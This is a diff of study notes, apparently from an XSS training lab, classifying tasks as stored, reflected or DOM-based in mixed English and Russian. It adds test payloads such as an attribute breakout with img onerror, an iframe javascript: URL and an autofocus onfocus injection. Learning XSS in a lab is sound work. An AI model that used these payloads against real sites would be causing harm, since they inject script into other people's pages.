@@ -63,11 +63,13 @@ Stored, Reflected, DOM-Based, Self, Blind XSS
 
 ## TASK 3
 
+"><img src="x" onerror="prompt(1)">
 1) and title
 2) stored xss, имя только
 
 ## TASK 4
 
+<img src=x onerror="alert(1)">
 1) link, nothing
 2) reflected xss, да нужен
 
@@ -77,6 +79,20 @@ Stored, Reflected, DOM-Based, Self, Blind XSS
 2) нету, dom xss
 
 ## TASK 6
+
+<iframe src=javascript:alert(1)>
+<img src=x onerror=alert(1)>
+1) только в тексте 
+2) stored xss, только в тексте нужен payload
+
+## TASK 7
+
+" autofocus onfocus=alert(1) x="
+1) get, проверка промокода
+2) reflected, да есть, payload не выполнится
+
+## TASK 8
+
 
 
 
